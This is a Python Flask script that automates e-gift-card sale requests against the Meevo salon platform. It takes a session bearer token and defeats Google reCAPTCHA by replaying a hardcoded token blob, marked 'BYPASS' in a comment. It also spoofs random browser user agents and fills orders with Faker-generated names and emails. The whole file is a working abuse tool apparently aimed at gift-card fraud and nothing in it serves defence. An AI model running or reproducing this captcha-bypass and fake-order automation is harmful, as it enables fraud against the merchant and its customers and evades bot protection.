import json
import re
import random
from faker import Faker
from flask import Flask, jsonify
import httpx

app = Flask(__name__)

def cap(string, start, end):
    return re.search(f'{re.escape(start)}(.*?){re.escape(end)}', string).group(1)

def Capture(string, starting_word, ending_word):
    substring_start = string.find(starting_word)
    substring_start += len(starting_word)
    size = string.find(ending_word, substring_start) - substring_start
    return string[substring_start:substring_start+size]

@app.route('/process', methods=['GET'])
def process():
    # Tenant/Template
    ids = [
        '101032|592faa18-5887-49da-a878-ab040111017c',
        '101060|757787b1-3533-4dda-99ab-ab4201177751',
        '101093|38a71632-5e92-4710-8546-ab59013ab3a6'
    ]
    chosen_id = random.choice(ids)
    tenant_id, template_TId = chosen_id.split("|")

    # CURL -1
    headers = {
        'Host': 'na0.meevo.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5'
    }

    with httpx.Client() as client:
        response = client.get(f'https://na0.meevo.com/egift/egft/RcToken?tenantId={tenant_id}&version=1&locationId=null&logOut=false&stashId=null', headers=headers)
        data = response.json()

    SID = cap(response.text, '"sessionId":"', '"')
    UID = cap(response.text, '"userId":"', '"')
    TOK = cap(response.text, '"bearerToken":"', '"')

    anchor_link = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lc4z-AUAAAAAOxF55bnvTnPaKm2sDTZN0wrAmet&co=aHR0cHM6Ly9uYTAubWVldm8uY29tOjQ0Mw..&hl=en&v=NZrMWHVy58-S9gVvad9HVGxk&size=invisible&badge=bottomright&cb=7q1yi7bsv8yw'
    anchor_ref = '' # Open Anchor Headers and see the referer link

    reload_link = 'https://www.google.com/recaptcha/api2/reload?k=6Lc4z-AUAAAAAOxF55bnvTnPaKm2sDTZN0wrAmet'
    v = 'NZrMWHVy58-S9gVvad9HVGxk'
    k = '6Lc4z-AUAAAAAOxF55bnvTnPaKm2sDTZN0wrAmet'
    co = 'aHR0cHM6Ly9uYTAubWVldm8uY29tOjQ0Mw..'
    chr = '[38,46,47]'
    bg = '!urygvLkKAAQeCR5ubQEHnAgEUqjy_nRMMvvcBEpQK8z2N1fEE69vKgSfNF95t26PN87XFzZE55fNLJPkvPd3Ogfix5TsApT5Hu0fV-2l2BQ6iaMkAouB0b1FR_X8Dagu4lgwmV6wJWG3RLoIDJLY7kfmlcz_iSzm6_iSGBqTHnEdJ2UjixQUpiCik_zUydRwIYF8Qu_nVTi5DBS0cCuJDBc9S5EJTuInS0IWyKVBqUqZ6WvjNzcg8Or8xuVTUBHo1-prRcDr1lehLDczBJjQ_S6-NeKzajBbR7Hq4gPRnoGTT9mru20CQMdEbeLd3TcrhS8VFzrfUIQfi__CUaIyDwGn-z62Jkemv4b8cF93E1p2IqBAKvnew5Q7VnoLHyJYMnqZV_CJIQlNN7VT9xX14-VrnHji46r8JvYvN9V0Ke0026tHovamrVfnU-97WoNXVXTyeQKqpwVf3BO7QZmO1li9A02bfZGqeNRnOznzR-9eNDZCjBaDLrU2JRd1Ap4XCsxAQ0jwTsdwAgVXijyvc7FGjJVQDV1CzCcNnkuULlLNTGkcN-j9adVBAo8adXOcnEgoUqRoX3zpqxmrSdeQQvtW_MBWsbnDtYqsATNNdnDRRyax7LGR9qoKjOcVGvQb4AOwt3m3ur4RAtWYyy1FWjIiPvQBkOBuGVh2S7fD-wYymZ5z5j29cv0B2JUYZFxZSBDYHy9X6_xbo977jCEGAwueUZ7Sl09RWfMCBHLAMWRm-RReSwb6bHZZK5Qz8l20w1EQsrOe4EdYvDcQmPF5z9J3dayLPnmCktPw_pqBsw8Eo-hdoFxWxSl1JM30Kqj9-UW2BoWm-wS6SX2P047fjZCeHYiWT0rbcwuviw7L73dVJSMsTx2X-WpUQlHqQlhnXza4hOid3cXsxKV9SdybjnMtGI54rrjWgjnAOGCDggF_H0JPKRi1nnfnxj2ewq91ocpRHucSxyeXUtcAmLYoJ2-rXZrWoaMimf29KNEErKF0q2H_Xf5Ovd9WOkDrl5ent2U3-AfyB1KCcT2YWiPTSHQRjj9HG6aj-2QBnLV8a-pPrSjUzE9_HaICVIoDuDUA92CXBcQwK5DbLnb5rmmneD7yrDvn_lj_OhOEof-AISV6b3pGjWtLdIhy7GUHJQ7lqRza4-bejYFjO2DIGUkJLXt3hA0fEdFIYSfit4Ecz7bWzy29a7IiAXnhSUwTw5qcIzjM6esQmh1wBNrGxXfRFNkuAnliw7ex0xO93Pyb63lF_p2YMd7uDDubnEIMzxjLWdZ2HSzpRhrFRzfZ9eDrrG_2vLoIklYS2KmDjpTtvjeFA-CC0xtlJEuQG_66I5mHHD5L_aqTYy2-b3kZPv2uMHu1HJkvnvmALy4U9tgY5FQWvhn6G23pWJYs0sfbyt3M-fYIFlsZsoHPh1lIflt7jeEYtOMCD8ahERdGjAH3KMmN9a6RwVjhnZOGjdKC5lZEtYF0PHFH_Tjb1eaH4eMQ6kzcvudW8H_4OYaToQlNW7qX9tv9wXZikvrtqMPs80Gwh9VoNN2EpcEqIUZJXUAvG-FxPREjTnLteSqx-DN8H6guu_1AEaz0rqgKrpfCLole0T_5W3dktqC5_CFweC0oO3dgMHldkO8oH5gu4tOVHghVYxoTvllo03jcJ1mJlwW2eHNI-UFFaUKqO5QpX2OhGLeIyuzqd7jI4nxiUgg8EeHSJhTar3BjuxISx1dOEpHZV61zO5AMSRV2kOH1YDN14obuyyDEvGiQ_OHPBLs3zGK911nsnLVqELkMBx6uHlfqxzoyOyLkk8O3KIBdlrG9mBgOpbp3tfJea-Vh5nWXgKsuUTt6QaIsnKkr2yvU7tIU-1Cdbn7TrdoMcLPJ-97EUqrnYns9kixIdD0LsSjmhrwaFMdDs5MHyBgFZ1P1SlBPsguFEeWU7aTUuX8Bz57-mVaVI5pSAnrEDisI65OdzBJg2ZwQ4krIrOM_1HkKsx5JpvHPJUiPfxfkrsXvCZ-e6MzvMbp9E63RF-MjUkWATY6g9cRDObulfswoeafaFrt6RUMeg-bi--SrJmZ6JYIFArrff5lQcG3h_1ZX9eiI196DQ7GIfMUeNbK7UK7S8uW32md8vSNIFvD3xuTvdIlKRK4BgWFd7BzPH_krw7CHvdfYI4sBEIh9IRUfx4Zn9WCbECXWly9na68Ux7B9ux7qUEWP6nreRP8eNBZ_SqRVf6JNBhVuNx39L_px8jzRAXCKlkYe32-phEblNI5XfqiFXR4j_Dy8YRWIUM8O5s58J_t-cpeHSVfRqo7c7IUo3ybUrOrWchHrnjD9o4ZAfKzEK_QDxN2zbBQrccmLTyjkrWI779OyZJkMBY7lel4beF7sJMwE3Yu6j1VvhXIRVdV5J6knHRMT_HEAEW8_E0rZLK9ETRU7iGtio3DKlMBT0krgHmd2KX1cvmf8Cl9ygR-RL5eT7MEgoFStzVuPhr8iZ57TDFaq1X_bYGT2c_i1xleAbFMC0Q7zMKrMRiF-HfXDt8agsDF3eKu6zWrEUSTjDywaF--F8vADInSRnmUcPcMq6wydBT5-waxm_3IQxNUJsp-XPEo22HtlyI5LJZ56-nYXIYDl6fQRxM0ps8EjJNZmRYF2VGakao_EezCHj83jOq2DSow2uLGtNxsI704l5Sro9Jt5aGqo4qZgnChXmI3Kv0VUyLld4aJMfcQIxHUawbN4wz5OMzkuF-xSSvMgvrYCqSgrJUXkCh4SIXbKZ2n7d_GA2-vg' 
    vh = '-1020083849'

    # BYPASS
    headers = {
        'authority': 'www.google.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'referer': anchor_ref,
        'sec-fetch-dest': 'iframe',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'upgrade-insecure-requests': '1',
        'user-agent': f'Mozilla/5.0 (Windows NT {random.randint(11,99)}.0; Win64; x64) AppleWebKit/{random.randint(111,999)}.{random.randint(11,99)} (KHTML, like Gecko) Chrome/{random.randint(11,99)}.0.{random.randint(1111,9999)}.{random.randint(111,999)} Safari/{random.randint(111,999)}.{random.randint(11,99)}'
    }

    with httpx.Client() as client:
        response = client.get(anchor_link, headers=headers)
        rtk = Capture(response.text, '<input type="hidden" id="recaptcha-token" value="', '"')

    data = {
        'v': v,
        'reason': 'q',
        'c': rtk,
        'k': k,
        'co': co,
        'hl': 'en',
        'size': 'invisible',
        'chr': chr,
        'vh': vh,
        'bg': bg
    }

    with httpx.Client() as client:
        response = client.post(reload_link, headers=headers, data=data)
        captcha = Capture(response.text, '["rresp","', '"')

    url = f'https://na0.meevo.com/egift/egft/Sale?tenantId={tenant_id}'
    headers = {
        'Host': 'na0.meevo.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Authorization': f'Bearer {TOK}',
        'Content-Type': 'application/json',
        'Origin': 'https://na0.meevo.com'
    }

    fake = Faker()
    email = fake.email()
    zip_code = fake.zipcode()
    name = fake.first_name()
    last = fake.last_name()

    payload = {
        "giftCards": [
            {
                "templateId": template_TId,
                "emailAddressFrom": email, 
                "emailAddressTo": email,
                "message": f"{name} {last}",
                "fullNameFrom": f"{name} {last}",
                "firstNameTo": name,
                "lastNameTo": last,
                "deliveryMethod": 30545,
                "saleLineItem": {
                    "clientGiftCard": {
                        "remainingAmount": 10
                    },
                    "startDate": "2024-01-28"
                },
                "hideOriginalAmount": False,
                "shippingFeeId": None,
                "shippingAddress": {}
            }
        ],
        "rcToken": captcha,
        "rcVersion": 1,
        "billingPostalCode": "10080"
    }

    # Make the request
    with httpx.Client() as client:
        response = client.post(url, headers=headers, json=payload)
        return jsonify(response.json())

if __name__ == '__main__':
    app.run(debug=True)
